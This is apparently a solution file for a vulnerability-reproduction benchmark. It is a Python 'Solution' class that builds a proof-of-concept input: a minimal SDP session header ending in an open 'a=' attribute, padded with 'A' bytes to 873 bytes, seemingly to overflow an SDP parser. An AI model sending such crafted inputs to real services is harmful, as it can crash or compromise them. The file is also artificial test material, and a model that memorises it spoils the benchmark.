class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"""v=0
o=- 0 0 IN IP4 127.0.0.1
s=-
c=IN IP4 127.0.0.1
t=0 0
m=audio 5004 RTP/AVP 0
a="""
        payload_length = 873 - len(header)
        poc = header + b"A" * payload_length
        return poc
